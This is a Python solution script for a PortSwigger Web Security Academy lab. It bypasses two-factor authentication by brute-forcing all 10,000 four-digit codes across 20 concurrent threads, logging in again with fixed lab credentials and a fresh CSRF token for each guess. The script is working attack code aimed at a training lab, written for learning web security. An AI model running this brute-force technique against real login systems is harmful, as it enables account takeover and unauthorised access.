#!/usr/bin/env python3
"""
2FA bypass using a brute-force attack
PortSwigger Web Security Academy -- Authentication

Companion script for the writeup: 09-2fa-bypass-using-a-brute-force-attack.md

What this does:
    Two wrong mfa-codes log the session out entirely and the code itself is
    thrown away, so there's no static secret to sweep sequentially. Instead each
    guess is its own full re-authentication cycle: POST /login with the known
    credentials (carlos:montoya, a fixed account this lab provides), extract a
    fresh CSRF token from the resulting /login2 page, then POST /login2 with one
    candidate code and check whether the final URL lands on /my-account. This
    runs 20 such cycles concurrently -- since every attempt generates its own
    fresh code, no synchronization between workers is needed. One 10,000-code
    pass gives roughly a 63% chance of a hit, so this retries up to 5 passes for
    ~99%+ cumulative probability, then replays the winning code on a clean
    session (the lab's tracker only flips on that session, not a worker thread's).

Usage:
    python 09-2fa-bypass-using-a-brute-force-attack.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import threading
import httpx
from concurrent.futures import ThreadPoolExecutor, as_completed

USERNAME = "carlos"
PASSWORD = "montoya"
MAX_WORKERS = 20


def _csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def _login(client: httpx.Client, lab_url: str) -> httpx.Response:
    login_page = client.get(f"{lab_url}/login")
    return client.post(f"{lab_url}/login", data={
        "csrf": _csrf(login_page.text), "username": USERNAME, "password": PASSWORD
    })


def brute_force_pass(lab_url: str) -> str | None:
    """One full 10,000-code sweep, 20 concurrent independent re-login cycles."""
    codes = [f"{c:04d}" for c in range(10000)]
    stop = threading.Event()
    found = [None]
    lock = threading.Lock()
    counter = {"n": 0}
    counter_lock = threading.Lock()

    def try_code(code_str: str):
        if stop.is_set():
            return
        try:
            with httpx.Client(follow_redirects=True, timeout=15) as c:
                login2_resp = _login(c, lab_url)
                csrf = _csrf(login2_resp.text)
                data = {"mfa-code": code_str}
                if csrf:
                    data["csrf"] = csrf
                resp = c.post(f"{lab_url}/login2", data=data)
                with counter_lock:
                    counter["n"] += 1
                    if counter["n"] % 500 == 0:
                        print(f"[*] Progress: {counter['n']}/{len(codes)} attempts...")
                if "/my-account" in str(resp.url):
                    with lock:
                        if found[0] is None:
                            found[0] = code_str
                    stop.set()
        except httpx.HTTPError:
            pass

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        futures = {pool.submit(try_code, c): c for c in codes}
        for f in as_completed(futures):
            if stop.is_set():
                for pending in futures:
                    pending.cancel()
                break

    return found[0]


def solve(lab_url: str) -> None:
    winning_code = None
    for attempt in range(1, 6):
        print(f"[*] Pass {attempt}/5 -- brute-forcing {10000} codes with {MAX_WORKERS} workers (re-login each)...")
        result = brute_force_pass(lab_url)
        if result:
            winning_code = result
            print(f"[+] 2FA code matched: {result}")
            break
        print(f"[-] Pass {attempt} no match, retrying...")

    if not winning_code:
        print("[-] Lab not solved after 5 passes.")
        return

    # Replay the winning code on a clean session -- the lab tracks solve state
    # against one specific browser-facing session, not the worker thread that found it.
    client = httpx.Client(follow_redirects=True, timeout=15)
    _login(client, lab_url)
    login2_page = client.get(f"{lab_url}/login2")
    csrf = _csrf(login2_page.text)
    data = {"mfa-code": winning_code}
    if csrf:
        data["csrf"] = csrf
    client.post(f"{lab_url}/login2", data=data)
    client.get(f"{lab_url}/my-account")

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
